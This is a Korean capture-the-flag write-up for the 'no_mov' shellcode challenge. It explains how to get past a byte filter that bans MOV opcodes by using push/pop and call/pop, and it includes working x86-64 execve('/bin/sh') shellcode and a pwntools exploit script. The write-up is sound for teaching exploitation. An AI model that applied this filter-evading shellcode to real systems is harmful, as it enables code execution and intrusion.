# no_mov

## 개요

`main()`이 랜덤 주소에 **RWX 페이지**를 mmap 하고 셸코드(최대 `0x800` 바이트)를 읽어 실행해주는 전형적인 셸코드 실행 문제인데, `verify()`가 셸코드에 **MOV 계열 opcode 바이트**가 하나라도 있으면 거부함. 즉 `mov` 없이, 그리고 금지 바이트를 피해서 `execve("/bin/sh")`를 구성해야 하는 제약 셸코딩(constrained shellcoding) 문제임.

> 이 디렉토리에는 바이너리 없이 `poc.py`만 있음(배포본의 `main`은 로컬에만 존재). 아래 내용은 `poc.py`에 문서화된 분석을 정리한 것임.

## 실행 환경 분석 ( `main` )

- 랜덤 주소에 `mmap(PROT_READ|PROT_WRITE|PROT_EXEC)`로 실행 가능한 페이지(`sh`)를 잡고 `read(0, sh, 0x800)`로 셸코드를 입력받음.
- `verify()`를 통과하면 모든 레지스터를 0으로 밀고(`rax=rsi=rdx=0`), `rsp/rbp`를 스택 페이지로 맞춘 뒤 `ret`으로 셸코드 시작 지점(`sh`)으로 점프함.
- 즉 셸코드 진입 시점에 이미 `rax=0, rsi=0, rdx=0`이 보장됨 → `execve`의 `argv`, `envp`(= `rsi`, `rdx`)를 따로 0으로 만들 필요가 없음.

## 제약: `verify()`의 금지 바이트

`verify()`는 명령어 단위가 아니라 **바이트 단위**로 셸코드 전체를 스캔해서, 아래 바이트가 하나라도(즉시값·주소 중간에 섞여도) 있으면 거부함:

```
0x88 0x89 0x8A 0x8B 0x8C 0x8E     ; mov r/m, r / mov r, r/m / mov sreg 등
0xA0 0xA1 0xA2 0xA3 0xA4 0xA5     ; mov al/ax/eax, moffs / movs
0xB0 ~ 0xBF                       ; mov r8/r16/r32/r64, imm (mov reg, imm 계열 전부)
0xC6 0xC7                         ; mov r/m, imm
```

핵심 난점 두 가지:

1. **`mov reg, imm`을 못 씀** (`0xB0~0xBF`, `0xC6/0xC7` 금지) → 레지스터에 상수(예: `execve` 번호 0x3b)를 직접 넣을 수 없음.
2. **즉시값/주소 바이트에도 금지 바이트가 섞이면 안 됨** → 단순히 다른 명령으로 우회해도, 그 명령의 인코딩에 `0x88~0x8E`, `0xB*` 등이 나오면 걸림.

## 아이디어

### (1) 상수는 `push imm8 ; pop`으로

`mov rax, 0x3b` 대신:

```asm
push 0x3b        ; 6a 3b   (push imm8)
pop  rax         ; 58
```

`push imm8`(opcode `0x6a`)와 `pop`(`0x58`/`0x5f`)은 모두 허용 바이트. `rax`에 59(`execve`)를 넣음. `rsi`, `rdx`는 진입 시 이미 0.

### (2) `/bin/sh` 문자열 주소는 `call/pop`으로 (push 스택 쌓기 불가)

보통은 `/bin/sh\0`를 스택에 `push`로 쌓지만, 이 문제에선 불가능함:

- `push imm32`는 x86-64에서 항상 **64비트로 부호확장**되어 상위 4바이트가 끼어듦. 그래서 `"/bin"`, `"/sh\0"`를 나눠 push 하면 `"/bin\0\0\0\0/sh\0"`처럼 중간에 널이 박혀 `execve("/bin")`이 되어 실패함.

대신 **`call/pop`으로 RIP-상대 문자열 주소**를 얻음. mmap 주소가 랜덤이어도 상대주소라 무관:

```asm
    jmp bottom          ; eb ..
top:
    pop  rdi            ; 5f   rdi = call 복귀주소 = &"/bin/sh"
    push 0x3b           ; 6a 3b
    pop  rax            ; 58   rax = 59 (execve)
    syscall             ; 0f 05  (rsi=rdx=0 은 이미 0)
bottom:
    call top            ; e8 ..  복귀주소(="/bin/sh" 시작)를 push 하고 top으로
    .string "/bin/sh"   ; 2f 62 69 6e 2f 73 68 00
```

`call top`이 실행되면 그 **직후 주소**(= `.string "/bin/sh"`의 시작)가 스택에 push 됨. `top`에서 `pop rdi`로 그 주소를 `rdi`에 담으면 정확히 `&"/bin/sh"`가 됨.

### 사용 opcode 전수 확인

| 바이트 | 명령 | 금지? |
|---|---|---|
| `eb` | `jmp short` | 허용 |
| `e8` | `call rel32` | 허용 |
| `5f` / `58` | `pop rdi` / `pop rax` | 허용 |
| `6a` | `push imm8` | 허용 |
| `0f 05` | `syscall` | 허용 |
| `2f 62 69 6e 2f 73 68 00` | `"/bin/sh\0"` | 허용 |

poc는 `BANNED` 집합으로 어셈블 결과를 self-check 하여 금지 바이트가 섞이지 않았음을 `assert`로 검증함.

## 익스플로잇 ( `poc.py` )

```python
context.arch = "amd64"
shellcode = asm("""
    jmp bottom
top:
    pop  rdi
    push 0x3b
    pop  rax
    syscall
bottom:
    call top
    .string "/bin/sh"
""")

# 금지 바이트 self-check
BANNED = set([0x88,0x89,0x8A,0x8B,0x8C,0x8E,0xA0,0xA1,0xA2,0xA3,0xA4,0xA5]
             + list(range(0xB0,0xC0)) + [0xC6,0xC7])
assert not [b for b in shellcode if b in BANNED]

io.sendafter(b"> ", shellcode)
time.sleep(0.3)                 # read(0, sh, 0x800) 한 번과 셸 입력이 섞이지 않게 분리
io.sendline(b"id; cat flag; echo ===END===")
io.interactive()
```

`time.sleep(0.3)`이 필요한 이유: `main`이 `read(0, sh, 0x800)`로 **한 번에** 읽기 때문에, 셸코드와 셸 명령(`id; cat flag`)을 같은 read에 몰아넣으면 뒤쪽이 소비되어 `/bin/sh`의 stdin이 EOF가 됨. 셸코드만 먼저 읽히도록 잠깐 쉰 뒤 명령을 보냄.

## 핵심 요약

| 요소 | 내용 |
|---|---|
| 유형 | 제약 셸코딩 (RWX mmap에 셸코드 실행) |
| 제약 | `mov` 계열 opcode 바이트(`0x88~0x8E`, `0xA0~0xA5`, `0xB0~0xBF`, `0xC6/0xC7`) 금지, 바이트 단위 스캔 |
| 상수 로드 | `mov reg,imm` 대신 `push imm8 ; pop reg` |
| 문자열 주소 | `push`로 스택에 쌓기 불가(부호확장 널 끼어듦) → `call/pop`으로 RIP-상대 주소 획득 |
| 진입 조건 | `rax=rsi=rdx=0` 보장 → `execve` 인자 세팅 최소화 |
| 최종 | `execve("/bin/sh", 0, 0)` |

이 문제의 교훈은, `mov`가 막혀도 `push/pop`으로 상수를 올리고 `call/pop`으로 위치 독립적인 문자열 주소를 얻으면 짧은 셸코드로 충분히 우회할 수 있다는 점. 또한 opcode 필터는 "명령어"가 아니라 "바이트"를 보기 때문에, 즉시값·변위(displacement)에 금지 바이트가 섞이지 않도록 인코딩을 고르는 것이 중요함.
